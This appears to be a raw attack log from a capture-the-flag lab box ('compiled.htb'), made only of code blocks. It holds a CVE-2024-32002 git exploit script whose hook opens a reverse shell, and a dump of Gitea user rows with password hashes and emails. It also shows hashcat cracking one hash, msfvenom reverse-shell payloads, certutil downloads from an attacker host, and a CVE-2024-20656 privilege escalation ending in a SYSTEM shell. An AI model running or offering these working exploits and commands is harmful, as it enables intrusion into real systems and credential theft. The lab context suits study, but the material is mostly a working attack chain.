

```
#!/bin/bash

git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main

rm -rf repo1
rm -rf repo2

git clone http://gitea.compiled.htb:3000/test123/repo1.git
cd repo1
mkdir -p y/hooks
cat > y/hooks/post-checkout <<EOF
#!bin/sh.exe
bash -i >& /dev/tcp/10.10.16.17/9999 0>&1
EOF
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push
cd ..

git clone http://gitea.compiled.htb:3000/test123/repo2.git
cd repo2
git submodule add --name x/y "http://gitea.compiled.htb:3000/test123/repo1.git" A/modules/x
git commit -m "add-submodule"
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git push
```




https://github.com/HexDoesRandomShit/CVE-2024-32002



```
1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0
2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
6|test|test||test@test.com|0|enabled|0a6eef1c9bb27dbcaa0f60afe93d9d73d90500c8e45b6d8ae492633b8b16a7041d0debfedfa480783223d1b763fde572b930|pbkdf2$50000$50|0|0|0||0|||aa9dddfeb7f6582e0b92c1569d64e7ce|23ab310e796d6eaaecbe0755d0c8322f|en-US||1722312102|1722312102|1722312102|0|-1|1|0|0|0|0|1|0||test@test.com|0|0|0|0|0|0|0|0|0||arc-green|0
7|test123123|test123123||tester@example.com|0|enabled|0c4529d744cb35fd7051f3d2f768d5d3f58a625c96186d55a2ad4f4c8bdf8d9bd4af1694211b4605fcdf4f29ec20cc027e23|pbkdf2$50000$50|0|0|0||0|||a28351d0334f873edb0a100d5d7f36de|60b0c9db6ecc19526a8f9f3a77826692|en-US||1722332826|1722332826|1722332826|0|-1|1|0|0|0|0|1|0||tester@example.com|0|0|0|0|0|0|0|0|0||arc-green|0
8|gabeericwolf|gabeericwolf||gabeericwolf@gmail.com|0|enabled|aee9b8f434978d379900ee0daa17afffb3682c62edd614a71bc197aa11fddde763717a3f7bfb8966884c138c32dc20e5f88d|pbkdf2$50000$50|0|0|0||0|||2ddbcf173916ab69369d62f342463038|73d6982cf740c001c0cf960ba181ef1f|en-US||1722342712|1722343168|1722342712|0|-1|1|0|0|0|0|1|0||gabeericwolf@gmail.com|0|0|0|0|2|0|0|0|0||arc-green|0
9|test123|test123||tester123@example.com|0|enabled|b31daabdc6883121bd7d82021f73d107067c7692133b359c42b238c70f8e9899b4137647e92fad84209d2d64d72f07282a9b|pbkdf2$50000$50|0|0|0||0|||5de1ad43129786d544c4aa057e89bfc2|95592cbf44540b2a64f0560e0f3515f7|en-US||1722345681|1722348202|1722345681|0|-1|1|0|0|0|0|1|0||tester123@example.com|0|0|0|0|3|0|0|0|0||arc-green|0

```


```
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
```

```
PS D:\hashcat-6.2.6> .\hashcat.exe -m 10900 -a 0 whore.txt rockyou.txt -O -D 2
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3617.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

Kernel ./OpenCL/m10900-optimized.cl:
Optimized kernel requested, but not available or not required
Falling back to pure kernel

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 4 digests; 4 unique digests, 4 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921523
* Keyspace..: 14344387

sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>

Session..........: hashcat
Status...........: Running
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: whore.txt
Time.Started.....: Tue Jul 30 18:14:54 2024 (16 secs)
Time.Estimated...: Tue Jul 30 19:13:29 2024 (58 mins, 19 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12252 H/s (12.34ms) @ Accel:8 Loops:1024 Thr:128 Vec:1
Recovered........: 1/4 (25.00%) Digests (total), 1/4 (25.00%) Digests (new), 1/4 (25.00%) Salts
Progress.........: 215040/57377548 (0.37%)
Rejected.........: 0/215040 (0.00%)
Restore.Point....: 43008/14344387 (0.30%)
Restore.Sub.#1...: Salt:3 Amplifier:0-1 Iteration:137216-138240
Candidate.Engine.: Device Generator
Candidates.#1....: harley22 -> aaron10
Hardware.Mon.#1..: Temp: 66c Fan: 58% Util: 94% Core:2112MHz Mem:1740MHz Bus:8
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>


Session..........: hashcat
Status...........: Quit
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: whore.txt
Time.Started.....: Tue Jul 30 18:14:54 2024 (17 secs)
Time.Estimated...: Tue Jul 30 19:16:56 2024 (1 hour, 1 min)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    11562 H/s (12.01ms) @ Accel:8 Loops:1024 Thr:128 Vec:1
Recovered........: 1/4 (25.00%) Digests (total), 1/4 (25.00%) Digests (new), 1/4 (25.00%) Salts
Progress.........: 258048/57377548 (0.45%)
Rejected.........: 0/258048 (0.00%)
Restore.Point....: 57344/14344387 (0.40%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:6144-7168
Candidate.Engine.: Device Generator
Candidates.#1....: aaron08 -> 280396
Hardware.Mon.#1..: Temp: 67c Fan: 58% Util: 70% Core:1781MHz Mem:1742MHz Bus:8





Started: Tue Jul 30 18:14:49 2024
Stopped: Tue Jul 30 18:15:13 2024
PS D:\hashcat-6.2.6> .\hashcat.exe -m 10900 -a 0 whore.txt rockyou.txt -O -D 2 --show
sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
```

```
kali@kali ~> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.58 LPORT=9898 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```


```
kali@kali ~ [SIGINT]> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.58 LPORT=9797 -f exe -o shell2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell2.exe

```

```
*Evil-WinRM* PS C:\Users\Emily\Documents> upload shell.exe

Info: Uploading /home/kali/shell.exe to C:\Users\Emily\Documents\shell.exe

Data: 98400 bytes of 98400 bytes copied

Info: Upload successful!

```

```
*Evil-WinRM* PS C:\Users\Emily\Documents> upload RunasCs.exe

Info: Uploading /home/kali/RunasCs.exe to C:\Users\Emily\Documents\RunasCs.exe

Data: 70996 bytes of 70996 bytes copied

Info: Upload successful!

```


```
*Evil-WinRM* PS C:\Users\Emily\Documents> .\RunasCs.exe emily 12345678 "C:\Users\Emily\Documents\shell.exe"

No output received from the process.
```


```
C:\exploit>certutil.exe -urlcache -split -f http://10.10.14.58:9090/shell2.exe payload.exe
certutil.exe -urlcache -split -f http://10.10.14.58:9090/shell2.exe payload.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

C:\exploit>certutil.exe -urlcache -split -f http://10.10.14.58:9090/CVE-2024-20656/Expl.exe Expl.exe
certutil.exe -urlcache -split -f http://10.10.14.58:9090/CVE-2024-20656/Expl.exe Expl.exe
****  Online  ****
  000000  ...
  03f800
CertUtil: -URLCache command completed successfully.

```



```
PS C:\exploit>  $VSDiagnostics = get-item "C:\\*\\Microsoft Visual Studio\\*\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe" | select -last 1
 $VSDiagnostics = get-item "C:\\*\\Microsoft Visual Studio\\*\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe" | select -last 1

```

```
PS C:\exploit> c:\exploit\Expl.exe $VSDiagnostics.FullName "c:\exploit\payload.exe"
c:\exploit\Expl.exe $VSDiagnostics.FullName "c:\exploit\payload.exe"
[+] VSDiagnostics: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Team Tools\DiagnosticsHub\Collector\VSDiagnostics.exe
[+] Payload: c:\exploit\payload.exe
[+] Junction \\?\C:\0d130390-6bda-4ba6-8e70-172df14f6125 -> \??\C:\c5779b01-cd67-4aa4-8a91-8e67851975a3 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\0d130390-6bda-4ba6-8e70-172df14f6125 -> \RPC Control created!
[+] Junction \\?\C:\0d130390-6bda-4ba6-8e70-172df14f6125 -> \??\C:\c5779b01-cd67-4aa4-8a91-8e67851975a3 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\0d130390-6bda-4ba6-8e70-172df14f6125 -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!
```


```
kali@kali ~> nc -nvlp 9797
listening on [any] 9797 ...
connect to [10.10.14.58] from (UNKNOWN) [10.129.2.248] 51924
Microsoft Windows [Versin 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData\Microsoft\VisualStudio\SetupWMI>whoami
whoami
nt authority\system
```